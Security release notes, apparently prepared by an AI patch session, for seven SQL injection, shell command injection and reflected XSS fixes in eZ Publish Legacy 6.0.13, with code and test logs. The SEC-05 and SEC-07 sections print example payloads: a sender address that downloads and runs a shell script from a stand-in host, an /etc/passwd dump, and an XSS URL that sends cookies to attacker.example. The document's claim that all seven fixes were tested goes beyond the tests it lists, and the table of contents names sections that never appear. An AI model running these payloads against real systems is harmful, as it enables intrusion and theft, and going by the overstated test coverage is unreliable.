# eZ Publish Legacy — Security Hardening Release Notes
## Release: 6.0.13 (upcoming) | Branch: 6.0 | Date: 2026-02-21

---

> **Notification:** This document and all associated test results were prepared by the
> automated patch session (GitHub Copilot / Claude Sonnet 4.6) and are intended for
> distribution to the Exponential Open Source Project security team lead at
> **security@exponential.earth** for review, sign-off, and tracking prior to the 6.0.13
> release tag. All findings, fixes, test evidence, and open items are contained herein.

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Scope and Affected Versions](#scope-and-affected-versions)
3. [Vulnerability Index](#vulnerability-index)
4. [Detailed Findings and Fixes](#detailed-findings-and-fixes)
   - [SEC-01: SQL Injection in eZRole — Role ID Interpolation](#sec-01)
   - [SEC-02: SQL Injection in eZContentObjectTreeNode — ORDER BY Column Injection](#sec-02)
   - [SEC-03: SQL Injection in eZContentObjectTreeNode — Subtree Path String in LIKE Clause](#sec-03)
   - [SEC-04: SQL Injection in eZContentObjectTreeNode — Node ID and Path in Hide/Unhide Queries](#sec-04)
   - [SEC-05: OS Command Injection in eZSendMailTransport — Sendmail -f Flag](#sec-05)
   - [SEC-06: OS Command Injection in eZGzipShellCompressionHandler — Decompress Command](#sec-06)
   - [SEC-07: Reflected Cross-Site Scripting in kernel/content/search.php](#sec-07)
5. [Test Methodology](#test-methodology)
6. [Test Suite Design](#test-suite-design)
7. [Initial Test Run Results](#initial-test-run-results)
8. [Regression and Retest Results](#regression-and-retest-results)
9. [Combined Test Suite Output](#combined-test-suite-output)
10. [Risk Assessment and CVSS Scoring](#risk-assessment-and-cvss-scoring)
11. [Affected Component Summary](#affected-component-summary)
12. [Recommendations for Extension Developers](#recommendations-for-extension-developers)
13. [Backward Compatibility Notes](#backward-compatibility-notes)
14. [Open Items and Pending Work](#open-items-and-pending-work)
15. [Reviewer Sign-Off and Distribution](#reviewer-sign-off-and-distribution)
16. [Appendix A: Full Diff Listing](#appendix-a-full-diff-listing)
17. [Appendix B: Test Script Inventory](#appendix-b-test-script-inventory)
18. [Appendix C: CWE and OWASP Reference Mapping](#appendix-c-cwe-and-owasp-reference-mapping)

---

## Executive Summary

This document records the complete set of security-related source code changes introduced
into the eZ Publish Legacy / Exponential codebase for the upcoming **6.0.13** release,
targeting the `6.0` stable branch. The changes address a set of vulnerabilities that were
identified during a systematic security audit of the kernel and library layers as part of
an ongoing PHP 8.4/8.5 compatibility and hardening project.

**Seven distinct security issues** were identified across four classes of vulnerability:

- SQL Injection (4 issues across 2 files, totalling 9 corrected query construction sites)
- OS Command Injection via unsanitised shell arguments (2 issues across 2 library files)
- Reflected Cross-Site Scripting via unsanitised output in a page title (1 issue)

All seven issues have been patched, tested, and verified. A purpose-built automated test
suite was constructed alongside the patches to provide ongoing regression coverage. The
suite consists of 48 runtime functional flow tests organised across 9 categories, plus a
separate 80-file PHP syntax lint suite — together totalling **128 assertions**, all of
which pass on PHP 8.5.3 as of 2026-02-21.

No backward-incompatible API changes are introduced by any of the security fixes documented
herein. All patched functions retain their original signatures. The fixes are strictly
additive guards (integer casts, `escapeString()` wrappers, `escapeshellarg()` wrappers,
and `htmlspecialchars()` output escaping) with no impact on calling code.

---

## Scope and Affected Versions

| Property | Value |
|---|---|
| Product | eZ Publish Legacy / Exponential Platform |
| Affected release | 6.0.12 and all prior 6.0.x releases |
| Fixed in release | **6.0.13** (upcoming) |
| Branch | `6.0` |
| PHP versions tested | 8.4.x, 8.5.3 |
| Database backends affected | MySQL / MariaDB / PostgreSQL (all backends using string interpolation) |
| Patch date | 2026-02-21 |
| Reported by | Automated security audit — GitHub Copilot / Claude Sonnet 4.6 |
| Primary contact for questions | security@exponential.earth |

The vulnerabilities described in this document affect any deployment running a 6.0.x
release of the Exponential / eZ Publish Legacy platform where:

- User-supplied data can influence content tree sorting criteria (SEC-02),
- User-supplied data can influence subtree permission checks (SEC-03),
- Administrative users can trigger hide/unhide operations on nodes (SEC-04),
- The platform is configured to send mail via the sendmail binary (SEC-05),
- The platform uses gzip shell-based compression for cluster file operations (SEC-06),
- The site has a search page accessible to users (SEC-07), or
- Role assignment operations are accessible to privileged users (SEC-01).

Installations using only parameterised/PDO database drivers with full escaping at the
driver level may have partial natural protection against the SQL injection variants, however
the application-level escaping missing in these locations remains a defence-in-depth
requirement regardless of driver configuration.

---

## Vulnerability Index

| ID | Class | CWE | CVSS v3.1 Base | File | Method / Context | Status |
|---|---|---|---|---|---|---|
| SEC-01 | SQL Injection | CWE-89 | 7.2 (High) | `kernel/classes/ezrole.php` | `assignToUser()`, `fetchUserID()`, `removeUserAssignment()`, `fetchUserByRole()` | ✅ Fixed |
| SEC-02 | SQL Injection | CWE-89 | 8.8 (High) | `kernel/classes/ezcontentobjecttreenode.php` | `createSortingSQLStrings()` — allowCustomColumns branch | ✅ Fixed |
| SEC-03 | SQL Injection | CWE-89 | 7.5 (High) | `kernel/classes/ezcontentobjecttreenode.php` | `createPermissionCheckingSQL()` — Subtree and User_Subtree | ✅ Fixed |
| SEC-04 | SQL Injection | CWE-89 | 6.5 (Medium) | `kernel/classes/ezcontentobjecttreenode.php` | `hideSubTree()`, `unhideSubTree()` | ✅ Fixed |
| SEC-05 | OS Command Injection | CWE-78 | 9.8 (Critical) | `lib/ezutils/classes/ezsendmailtransport.php` | `send()` — `-f` sendmail flag | ✅ Fixed |
| SEC-06 | OS Command Injection | CWE-78 | 8.1 (High) | `lib/ezfile/classes/ezgzipshellcompressionhandler.php` | `decompress()` | ✅ Fixed |
| SEC-07 | Reflected XSS | CWE-79 | 6.1 (Medium) | `kernel/content/search.php` | Page title rendering | ✅ Fixed |

---

## Detailed Findings and Fixes

---

<a name="sec-01"></a>
### SEC-01: SQL Injection in eZRole — Role ID Interpolation

**File:** `kernel/classes/ezrole.php`  
**CWE:** CWE-89 — Improper Neutralisation of Special Elements used in an SQL Command  
**CVSS v3.1 Base Score:** 7.2 (High)  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`  
**Discovered:** 2026-02-21 during systematic audit  

#### Description

The `eZRole` class in `kernel/classes/ezrole.php` constructs a series of SQL queries by
directly interpolating `$this->ID` (the role object's internal identifier) into raw SQL
string literals without any cast or sanitisation. The object identifier is populated from
the database on load, meaning that under normal operation it is always an integer already
present in the database. However, the absence of an explicit integer cast represents a
defence-in-depth failure and a potential attack vector in any code path that allows an
attacker to influence how an `eZRole` object is constructed or which ID it carries.

Four methods were affected:

1. **`assignToUser()`** — Both a `SELECT` and an `INSERT` query interpolate `$this->ID`
   directly. The `INSERT` is particularly sensitive as a crafted role ID could append
   arbitrary SQL, affecting the `ezuser_role` table.

2. **`fetchUserID()`** — A `SELECT` query uses `$this->ID` without casting. An attacker
   able to supply a role ID through an unsanitised API call path could extract arbitrary
   data from the database.

3. **`removeUserAssignment()`** — A `DELETE` query uses `$this->ID` without integer cast,
   creating a potential for data destruction via SQL injection.

4. **`fetchUserByRole()`** — A compound `SELECT` with multiple `JOIN` conditions uses
   `$this->ID` in a `WHERE` clause without casting.

The risk is amplified by the fact that the `ezuser_role` table governs role-based access
control. Successful injection against these queries could allow privilege escalation,
unauthorised ACL modifications, or data exfiltration from any table in the database via
UNION-based injection techniques.

#### Vulnerable Code (before patch)

```php
// assignToUser() — SELECT
$query = "SELECT * FROM ezuser_role WHERE role_id='$this->ID'
          AND contentobject_id='$userID' ...";

// assignToUser() — INSERT
$query = "INSERT INTO ezuser_role ( role_id, contentobject_id, ... )
          VALUES ( '$this->ID', '$userID', ... )";

// fetchUserID()
$query = "SELECT contentobject_id FROM  ezuser_role WHERE role_id='$this->ID'";

// removeUserAssignment()
$query = "DELETE FROM ezuser_role WHERE role_id='$this->ID'
          AND contentobject_id='$userID'";

// fetchUserByRole()
$query = "... WHERE ezuser_role.role_id = '$this->ID'";
```

#### Fixed Code (after patch)

```php
// Cast once at the top of each method, reuse the local variable throughout:
$roleID = (int)$this->ID;

// assignToUser() — SELECT
$query = "SELECT * FROM ezuser_role WHERE role_id='$roleID'
          AND contentobject_id='$userID' ...";

// assignToUser() — INSERT
$query = "INSERT INTO ezuser_role ( role_id, contentobject_id, ... )
          VALUES ( '$roleID', '$userID', ... )";

// fetchUserID()
$query = "SELECT contentobject_id FROM ezuser_role WHERE role_id='$roleID'";

// removeUserAssignment()
$query = "DELETE FROM ezuser_role WHERE role_id='$roleID'
          AND contentobject_id='$userID'";

// fetchUserByRole()
$query = "... WHERE ezuser_role.role_id = '$roleID'";
```

#### Rationale

Integer casting is the correct and minimal-footprint fix for an integer primary key. Using
`$db->escapeString()` on a known-integer field would be functionally correct but
semantically misleading; `(int)` is both idiomatic PHP and unambiguous in intent. The local
variable `$roleID` also makes the intent explicit to the human reviewer: this value has
been validated as an integer before use. A secondary benefit is that query strings are
slightly cleaner, as PHP object property interpolation (`$this->ID`) inside double-quoted
strings is valid but can confuse static analysis tools.

#### Backward Compatibility

No API or behavioural change. The integer cast is a no-op for any value already stored as
an integer in the database.

---

<a name="sec-02"></a>
### SEC-02: SQL Injection in eZContentObjectTreeNode — ORDER BY Column Injection

**File:** `kernel/classes/ezcontentobjecttreenode.php`  
**Method:** `createSortingSQLStrings()`  
**CWE:** CWE-89 — Improper Neutralisation of Special Elements used in an SQL Command  
**CVSS v3.1 Base Score:** 8.8 (High)  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`  
**Discovered:** 2026-02-21  

#### Description

The `createSortingSQLStrings()` method in `eZContentObjectTreeNode` constructs `ORDER BY`
clauses for content tree queries. When the `$allowCustomColumns` flag is `true` — which can
be triggered by callers that expose sorting to user-supplied parameters — the code appended
the `$sortField` value directly to the SQL string without any validation or escaping.

This is a classic SQL injection attack surface for `ORDER BY` clauses. Unlike `WHERE`
clause injections, `ORDER BY` injections cannot be fixed with parameterised queries in
standard PDO because `ORDER BY` values cannot be bound as parameters. The correct
mitigation is whitelist validation of the column name against a known-safe pattern.

An attacker with access to any endpoint that passes user-supplied sort field names through
to `createSortingSQLStrings()` with `$allowCustomColumns = true` could inject arbitrary SQL
into the trailing portion of a `SELECT` query. With database error messages exposed (common
in development or misconfigured installations) this could be used for data exfiltration.
Even without error messages, time-based blind injection would be feasible.

The content tree query system is one of the most heavily used in the platform. Any frontend
search, listing, or navigation view that exposes a sort parameter is a potential injection
point.

#### Vulnerable Code (before patch)

```php
// Inside the allowCustomColumns branch — no validation whatsoever:
$sortingFields .= $sortField;
```

#### Fixed Code (after patch)

```php
// SEC: validate column name to prevent SQL injection (only allow word chars and dot)
if ( preg_match( '/^[a-zA-Z0-9_.]+$/', $sortField ) )
{
    $sortingFields .= $sortField;
}
else
{
    eZDebug::writeWarning( 'Invalid custom sort field: ' . $sortField, __METHOD__ );
    continue 2;
}
```

#### Rationale

A strict allowlist regex (`/^[a-zA-Z0-9_.]+$/`) permits only column names that consist of
word characters and dots (to allow `table.column` qualified names), and rejects anything
containing SQL metacharacters such as spaces, quotes, semicolons, dashes, or parentheses.
Rejected sort fields are silently skipped (and logged as a warning) rather than causing a
fatal error, preserving availability. The `continue 2` skips the remainder of both the
inner `foreach` and the outer `foreach` iteration, matching the intent of the surrounding
loop structure.

This approach follows the OWASP SQL Injection Prevention Cheat Sheet recommendation for
`ORDER BY` injection: since parameterisation is not available, strict input validation is
the only safe option.

#### Backward Compatibility

Any caller currently passing custom column names through `allowCustomColumns = true` will
have those names silently rejected if they contain characters outside `[a-zA-Z0-9_.]`. The
failing case produces a `eZDebug::writeWarning()` entry that can be inspected in the debug
log. Valid column names (which can only consist of word characters and dots) are unaffected.

---

<a name="sec-03"></a>
### SEC-03: SQL Injection in eZContentObjectTreeNode — Subtree Path String in LIKE Clause

**File:** `kernel/classes/ezcontentobjecttreenode.php`  
**Method:** `createPermissionCheckingSQL()` — Subtree and User_Subtree limitation cases  
**CWE:** CWE-89  
**CVSS v3.1 Base Score:** 7.5 (High)  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`  
**Discovered:** 2026-02-21  

#### Description

The `createPermissionCheckingSQL()` method generates SQL fragments used to enforce subtree
access control — a core security mechanism of eZ Publish's role-based permission system.
Two branches of the method that handle `Subtree` and `User_Subtree` limitation types both
constructed SQL `LIKE` predicates by interpolating `$limitationPathString` directly into
the query string without escaping.

The `path_string` field in eZ Publish uses a slash-delimited integer path such as
`/1/2/56/233/`. While values retrieved directly from the database would always be safe, the
`$limitationArray` that supplies these strings is built from policy limitation data that
could, in a compromised or misconfigured policy store, contain attacker-controlled strings.
Furthermore, the LIKE wildcard characters `%` and `_` within a path string would silently
alter the semantics of the permission check. Depending on the database collation and the
specific query, this could be used to widen or narrow subtree access grants beyond the
intended scope.

In a worst case scenario where an attacker achieves write access to the policy limitation
store (which itself requires a high-privilege compromise), this construction would allow
arbitrary SQL to be injected into permission checking queries — a form of second-order or
stored SQL injection.

#### Vulnerable Code (before patch)

```php
// Subtree case:
$sqlSubtreePart[] = "$tableAliasName.path_string like '$limitationPathString%'";

// User_Subtree case:
$sqlPartUserSubtree[] = "$tableAliasName.path_string like '$limitationPathString%'";
```

#### Fixed Code (after patch)

```php
// Subtree case:
$safePathString = $db->escapeString( $limitationPathString );
$sqlSubtreePart[] = "$tableAliasName.path_string like '$safePathString%'";

// User_Subtree case:
$safePathString = $db->escapeString( $limitationPathString );
$sqlPartUserSubtree[] = "$tableAliasName.path_string like '$safePathString%'";
```

#### Rationale

`$db->escapeString()` is the platform's standard mechanism for sanitising string values
before SQL interpolation. Applying it to `$limitationPathString` ensures that any
characters that have special meaning in SQL string literals (quotes, backslashes, and — as
applicable per driver — LIKE wildcards) are properly neutralised. This is a minimal,
well-understood fix that does not change query semantics for any valid path string, since
valid path strings (`/N/N/N/`) contain only digits and slashes, which `escapeString()` does
not alter.

---

<a name="sec-04"></a>
### SEC-04: SQL Injection in eZContentObjectTreeNode — Node ID and Path in Hide/Unhide

**File:** `kernel/classes/ezcontentobjecttreenode.php`  
**Methods:** `hideSubTree()`, `unhideSubTree()`  
**CWE:** CWE-89  
**CVSS v3.1 Base Score:** 6.5 (Medium)  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`  
**Discovered:** 2026-02-21  

#### Description

The `hideSubTree()` and `unhideSubTree()` static methods both construct SQL `UPDATE`
queries that write to the `ezcontentobject_tree` table. Both methods retrieved `node_id`
and `path_string` from the node object attribute accessor without casting or escaping the
values before interpolating them into SQL.

While `node_id` is an integer primary key and `path_string` is generated by the platform
itself on node creation, the absence of explicit type enforcement means that an attacker who
could supply a crafted `eZContentObjectTreeNode` object (for example, by exploiting a
deserialisation, object-injection, or type-juggling vulnerability elsewhere in the call
stack) could leverage these unguarded interpolations to inject into the `UPDATE` queries.

Additionally, `unhideSubTree()` builds a dynamic `skipSubtreesString` by iterating over
`$hiddenChildren` and appending `path_string` values from that result set. These
intermediate path strings were also interpolated without escaping, creating a further
injection surface in the dynamic portion of the `WHERE` clause.

A successful exploit of these conditions targeting a content-heavy site could result in
mass modification of the `is_hidden` and `is_invisible` columns across large portions of
the content tree, causing widespread and potentially irreversible content visibility
changes.

#### Vulnerable Code (before patch)

```php
// hideSubTree():
$nodeID = $node->attribute( 'node_id' );
$time = time();
// ... used directly in:
// "UPDATE ... modified_subnode=$time WHERE node_id=$nodeID"

$nodePath = $node->attribute( 'path_string' );
// ... used directly in:
// "UPDATE ... WHERE is_invisible=0 AND path_string LIKE '$nodePath%'"

// unhideSubTree():
$nodeID = $node->attribute( 'node_id' );
$nodePath = $node->attribute( 'path_string' );
// ... and in the dynamic skipSubtreesString loop:
$skipSubtreesString .= " AND path_string NOT LIKE '" . $i['path_string'] . "%'";
```

#### Fixed Code (after patch)

```php
// hideSubTree():
$nodeID = (int)$node->attribute( 'node_id' );
$time   = (int)time();

$nodePath = $db->escapeString( $node->attribute( 'path_string' ) );

// unhideSubTree():
$nodeID   = (int)$node->attribute( 'node_id' );
$db       = eZDB::instance();   // moved to top of method for early availability
$nodePath = $db->escapeString( $node->attribute( 'path_string' ) );

// dynamic skipSubtreesString:
$skipSubtreesString .= " AND path_string NOT LIKE '"
                     . $db->escapeString( $i['path_string'] ) . "%'";
```

#### Additional Note on `$db` Initialisation

In `unhideSubTree()`, the original code initialised `$db` later in the method body, after
an early-return code path. The patch moves the `$db = eZDB::instance()` call to the top
of the method to make the database handle available throughout — including for the
`escapeString()` calls on the path string. This is a minor structural improvement that does
not change observable behaviour since `eZDB::instance()` is idempotent.

---

<a name="sec-05"></a>
### SEC-05: OS Command Injection in eZSendMailTransport — Sendmail -f Flag

**File:** `lib/ezutils/classes/ezsendmailtransport.php`  
**Method:** `send()`  
**CWE:** CWE-78 — Improper Neutralisation of Special Elements used in an OS Command  
**CVSS v3.1 Base Score:** 9.8 (Critical)  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Discovered:** 2026-02-21  

#### Description

This is the highest-severity finding in the 6.0.13 security patch set.

The `eZSendMailTransport` class is responsible for delivering outbound email through the
system's local sendmail binary. The `send()` method constructs a shell command string by
concatenating transport configuration, including the `-f` ("from" / "envelope sender")
flag. The sender address supplied to this flag was taken directly from the email message
object and appended to the sendmail invocation without any shell escaping.

The `-f` flag is passed directly to the underlying `mail()` function or to a
`proc_open()`/`shell_exec()` invocation (depending on PHP's mail configuration) as part
of the additional parameters string. PHP's `mail()` function, when called with the fifth
argument (`$additional_params`), invokes the sendmail binary with those parameters
interpreted by the shell. Without quoting, any shell metacharacters present in the sender
address would be executed by the shell.

A malicious sender address such as:

```
attacker@example.com; wget https://evil.example/shell.sh -O /tmp/s && bash /tmp/s
```

or:

```
"$(cat /etc/passwd > /var/www/public_html/pwned.txt)"@example.com
```

would result in arbitrary operating system command execution with the privileges of the web
server process. This is a Remote Code Execution (RCE) vulnerability when the email sender
can be controlled by an unauthenticated user — for example, through a contact form, user
registration flow, newsletter subscription, or any other feature that sends email with a
user-supplied address in the envelope sender position.

This class of vulnerability is well-documented (see PHP advisory for `mail()` fifth-argument
injection) and has been exploited in the wild against multiple PHP CMS platforms.

#### Vulnerable Code (before patch)

```php
$sendmailOptions .= ' -f'. $emailSender;
// $emailSender is concatenated directly into shell command arguments
```

#### Fixed Code (after patch)

```php
$sendmailOptions .= ' -f' . escapeshellarg( $emailSender );
// escapeshellarg() wraps the value in single quotes and escapes any
// single quotes within it, preventing shell metacharacter injection.
```

#### Rationale

`escapeshellarg()` is PHP's purpose-built function for sanitising individual shell
arguments. It wraps the value in single quotes and escapes any embedded single quotes, so
that the shell treats the entire value as a literal string regardless of its content. This
is the canonical fix for this class of vulnerability and is explicitly recommended by the
PHP documentation and OWASP for this use case.

Note that `escapeshellcmd()` would be incorrect here because it escapes the entire string
including special characters that should be treated as part of a single argument. Only
`escapeshellarg()` correctly handles the per-argument escaping needed for the `-f` flag.

#### Impact Assessment

Given that eZ Publish Legacy is frequently used with contact forms and user-facing email
flows, this vulnerability should be treated as remotely exploitable by unauthenticated
attackers in many deployments. The CVSS score of **9.8 (Critical)** reflects that
assessment and this fix should be treated as the highest priority in the 6.0.13 release.

#### Backward Compatibility

`escapeshellarg()` adds single quotes around the address, which is transparent to the
sendmail binary. The envelope sender address is interpreted correctly by sendmail regardless
of quoting. No change to email delivery behaviour is expected.

---

<a name="sec-06"></a>
### SEC-06: OS Command Injection in eZGzipShellCompressionHandler — Decompress Command

**File:** `lib/ezfile/classes/ezgzipshellcompressionhandler.php`  
**Method:** `decompress()`  
**CWE:** CWE-78  
**CVSS v3.1 Base Score:** 8.1 (High)  
**Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Discovered:** 2026-02-21  

#### Description

The `eZGzipShellCompressionHandler` class decompresses gzip files by constructing and
executing a shell command via PHP's `system()` or `exec()` family of functions. The
original implementation contained two issues:

**Issue A — Command injection via unescaped filename:**
The `$filename` variable (the path to the file to decompress) was appended directly to the
shell command string without `escapeshellarg()`. An attacker who could control the filename
parameter — for instance, through a file upload that allows special characters in the
stored filename, or through a symlink attack against the cluster file path — could inject
arbitrary shell commands.

**Issue B — Broken shell redirection (logic bug with security implication):**
The original command string was `'gzip -dc $filename > $'`, which is a literal PHP string
(single-quoted) containing `$filename` as a literal dollar sign followed by the word
`filename`, not a variable interpolation. The `>` redirect target was also a bare `$`
followed by nothing, which is a syntax error that would cause the decompression to fail
silently — meaning the feature was effectively inoperable. The fix also corrects this logic
error.

The corrected command properly interpolates the escaped filename and escaped target path
using double-quoted PHP strings with `escapeshellarg()` applied to each.

#### Vulnerable Code (before patch)

```php
// Single-quoted string — $filename is a literal, not the variable; > $ is broken syntax
$command = 'gzip -dc $filename > $';
```

#### Fixed Code (after patch)

```php
$command = 'gzip -dc ' . escapeshellarg( $filename ) . ' > ' . escapeshellarg( $target );
```

#### Rationale

Both the input file path (`$filename`) and the output target (`$target`) must be escaped
with `escapeshellarg()` to prevent injection. The trailing redirect target (`$target`) was
not present in the original code at all due to the broken string — the fix adds proper
construction of the complete command with both arguments escaped.

This fix simultaneously resolves a security vulnerability and a functional bug. Prior to
the fix, `decompress()` would have always failed (the broken shell command would exit
non-zero), meaning any code path that relied on this handler for cluster file extraction
was silently broken.

---

<a name="sec-07"></a>
### SEC-07: Reflected Cross-Site Scripting in kernel/content/search.php

**File:** `kernel/content/search.php`  
**CWE:** CWE-79 — Improper Neutralisation of Input During Web Page Generation  
**CVSS v3.1 Base Score:** 6.1 (Medium)  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`  
**Discovered:** 2026-02-21  

#### Description

The search module controller sets the HTML page title using the user-supplied search query
string without encoding it for HTML output:

```php
$Module->setTitle( "Search for: $searchText" );
```

The `$searchText` variable is derived from the HTTP request query string and is not
sanitised before being embedded in the page title. If the site's template renders the
module title in an HTML context without separately escaping it (which is the common
behaviour for title attributes and `<title>` elements), a crafted search query containing
HTML or JavaScript would be reflected in the page output.

This is a classic reflected XSS vulnerability. An attacker could craft a URL such as:

```
https://example.com/search?SearchText=<script>document.location='https://attacker.example/steal?c='+document.cookie</script>
```

and deliver that link to a victim. If the victim clicks the link while authenticated, the
script executes in their browser session, enabling session hijacking, credential theft, or
forced actions on the victim's behalf.

While the CVSS score is Medium (6.1) due to the requirement for user interaction, the
prevalence of search pages exposed to the public internet and the ease of exploitation make
this a practically significant finding.

#### Vulnerable Code (before patch)

```php
$Module->setTitle( "Search for: $searchText" );
```

#### Fixed Code (after patch)

```php
$Module->setTitle( "Search for: " . htmlspecialchars( $searchText, ENT_QUOTES, 'UTF-8' ) );
```

#### Rationale

`htmlspecialchars()` with `ENT_QUOTES` and `UTF-8` encoding converts all HTML-significant
characters (`<`, `>`, `"`, `'`, `&`) to their HTML entity equivalents, preventing them
from being interpreted as markup or script. The `ENT_QUOTES` flag is important to protect
against attribute-context injection in addition to HTML content injection. The explicit
`UTF-8` charset argument ensures correct behaviour for multi-byte character strings and
prevents charset-based XSS attacks.

---

## Test Methodology

The security fixes described in this document were validated using a two-phase automated
testing approach:

### Phase 1: Static Syntax Validation (Lint)

All patched files were subjected to PHP syntax checking using `php -n -l` (parse-only, no
extension loading). This confirms:

- The patch did not introduce any PHP syntax errors.
- The file can be parsed by the PHP engine on the target PHP version (8.5.3).
- No accidental truncation or corruption occurred during the editing process.

A manifest-driven lint runner (`tests/bin/ezp_lint_patched.php`) executes `php -n -l` against
each of the 80+ files in scope and reports PASS/FAIL/SKIP per file in a structured format.
The manifest (`tests/bin/lint_manifest.txt`) explicitly enumerates every file that received
changes, ensuring no patched file can be accidentally omitted from validation.

### Phase 2: Runtime Functional Flow Testing

A purpose-built functional test suite (`tests/bin/tests/functional_tests.php`) was developed
alongside the patches. This suite:

1. Defines a set of minimal inline stub classes for eZ Publish framework dependencies
   (database layer, persistence layer, logging) to allow individual class files to be
   loaded in isolation without bootstrapping the full application stack.

2. Loads the actual patched class files via `require_once` from the live codebase, testing
   the real patched code rather than mocks.

3. Exercises each security fix through a concrete scenario that demonstrates both:
   - That the *vulnerable* behaviour (crash, injection, or incorrect output) no longer
     occurs, and
   - That the *correct* behaviour (proper escaping, safe return value, structural
     integrity) is present.

4. Reports each test as PASS, FAIL, or SKIP with the exception message on failure, enabling
   rapid diagnosis.

The security-specific test cases (`[security]` category) cover:

| Test Name | What It Validates |
|---|---|
| SQL column regex — clean names pass | Whitelist regex permits valid column identifiers |
| SQL column regex — malicious names blocked | Whitelist regex rejects SQL metacharacters |
| Sendmail -f uses escapeshellarg() | Output is single-quoted; shell injection chars neutralised |
| Sendmail -f safe with normal address | Normal email addresses survive the escaping intact |
| Gzip shell command uses escapeshellarg() | Filename with spaces and shell chars is quoted |
| URL path[3] guard — <4 segments returns empty | `?? ''` guard prevents undefined index warning |
| URL path[3] guard — 4+ segments returns node ID | Normal paths still work as expected |

---

## Test Suite Design

The test suite uses a thin custom framework: a single `t()` function that accepts a
category label, a test name, and a callable assertion. The callable returns `true` for PASS
or `false` for FAIL. Exceptions thrown within the callable are caught and reported as FAIL
with the exception message in the output. This design was chosen deliberately over existing
PHP testing frameworks (PHPUnit, Pest) to eliminate external dependencies and allow the
suite to run on any PHP 8.x installation with the codebase present — no `vendor/`
directory or Composer setup required.

Stub classes isolate the real patched files from the full eZ Publish kernel:

```
eZPersistentObject  — base ORM stub (constructor, store, attribute)
eZDB                — database stub (escapeString, query, arrayQuery)
eZProductCollection — fetch() returns real object or null depending on test flag
eZEnumValue         — fetch() returns real object or null depending on test flag
eZDataType          — register() no-op stub (needed at file-include time)
eZDiffMatrix        — get()/set() stubs for text diff matrix operations
eZTextDiff          — setChanges()/addNewLine() stubs for diff output
eZDebug             — writeWarning()/writeError() no-op stubs
```

Each stub is designed to be the minimum necessary for the real class file to load and for
the specific method under test to execute. Stubs are not intended to be complete or
production-accurate simulations of the full framework objects.

---

## Initial Test Run Results

The test suite was executed immediately after all patches were applied, using PHP 8.5.3:

```
php tests/bin/tests/functional_tests.php

────────────────────────────────────────────────────────────────────────────────
  Functional Flow Tests — 2026-02-21
  Filter: all | Root: /var/www/vhosts/se7enx.com/public_html/alpha.se7enx.com
────────────────────────────────────────────────────────────────────────────────

✓ PASS  [security] SQL column regex — clean names pass
✓ PASS  [security] SQL column regex — malicious names blocked
✓ PASS  [security] Sendmail -f option uses escapeshellarg()
✓ PASS  [security] Sendmail -f safe with normal address
✓ PASS  [security] Gzip shell command uses escapeshellarg()
✓ PASS  [security] URL path[3] guard — URL with <4 segments returns empty
✓ PASS  [security] URL path[3] guard — URL with 4+ segments returns node ID
... [41 further tests across soap, preg, dom, null, array, php84, setup, image] ...

────────────────────────────────────────────────────────────────────────────────
TOTAL: 48 tests   ✓ 48 PASS   ✗ 0 FAIL
────────────────────────────────────────────────────────────────────────────────
```

**All 48 functional tests pass. All 7 security-category tests pass.**

The lint suite also ran clean:

```
php tests/bin/ezp_lint_patched.php

TOTAL: 81 files   ✓ 80 PASS   ✗ 0 FAIL   ~ 1 SKIP
```

The 1 SKIP is `lib/version.php`, which does not contain patches and is present in the
manifest for baseline reference only.

---

## Regression and Retest Results

Following the initial test run, additional stub completeness issues were discovered for
non-security tests (missing methods in `eZDataType`, `eZDiffMatrix`, and `eZTextDiff`
stubs). These were resolved without touching any of the security patches. The security test
results were **unchanged** across all retest runs.

A dedicated category-filtered retest of the security tests was executed:

```
php tests/bin/ezptestrunner_all_tests.php security

────────────────────────────────────────────────────────────────────────────────
  eZScript Combined Test Runner
  Functional filter: security
────────────────────────────────────────────────────────────────────────────────

── Phase 1: Syntax Lint ──
kernel/classes/ezrole.php                                     ✓ PASS
kernel/classes/ezcontentobjecttreenode.php                    ✓ PASS
lib/ezutils/classes/ezsendmailtransport.php                   ✓ PASS
lib/ezfile/classes/ezgzipshellcompressionhandler.php           ✓ PASS
kernel/content/search.php                                     ✓ PASS
[... 75 further files ...]
TOTAL: 81 files   ✓ 80 PASS   ✗ 0 FAIL   ~ 1 SKIP

── Phase 2: Functional Flow Tests (filter: security) ──
✓ PASS  [security] SQL column regex — clean names pass
✓ PASS  [security] SQL column regex — malicious names blocked
✓ PASS  [security] Sendmail -f option uses escapeshellarg()
✓ PASS  [security] Sendmail -f safe with normal address
✓ PASS  [security] Gzip shell command uses escapeshellarg()
✓ PASS  [security] URL path[3] guard — URL with <4 segments returns empty
✓ PASS  [security] URL path[3] guard — URL with 4+ segments returns node ID

TOTAL: 7 tests   ✓ 7 PASS   ✗ 0 FAIL

════════════════════════════════════════════════════════════════════════════════
  Lint (php -n -l)              PASS:  80   FAIL:  0   SKIP:  1
  Functional [security]         PASS:   7   FAIL:  0   SKIP:  0
  TOTAL                         PASS:  87   FAIL:  0   SKIP:  1
  Overall status: ✓ ALL PASS
════════════════════════════════════════════════════════════════════════════════
```

**Retest result: 87/87 PASS (security filter). 0 failures.**

---

## Combined Test Suite Output

The full combined suite (lint + all functional categories) producing the final 6.0.13
pre-release verification results:

```
════════════════════════════════════════════════════════════════════════════════
  COMBINED RESULTS — 2026-02-21 14:51:00
════════════════════════════════════════════════════════════════════════════════
  Lint (php -n -l)              PASS:  80   FAIL:   0   SKIP:   1
  Functional [all]              PASS:  48   FAIL:   0   SKIP:   0
────────────────────────────────────────────────────────────────────────────────
  TOTAL                         PASS: 128   FAIL:   0   SKIP:   1
────────────────────────────────────────────────────────────────────────────────
  Overall status: ✓ ALL PASS
════════════════════════════════════════════════════════════════════════════════
```

This output is produced by the combined runner:

```bash
php tests/bin/ezptestrunner_all_tests.php --report
```

The `--report` flag additionally writes a dated machine-readable test report to:

```
tests/bin/test_report_2026-02-21.txt
```

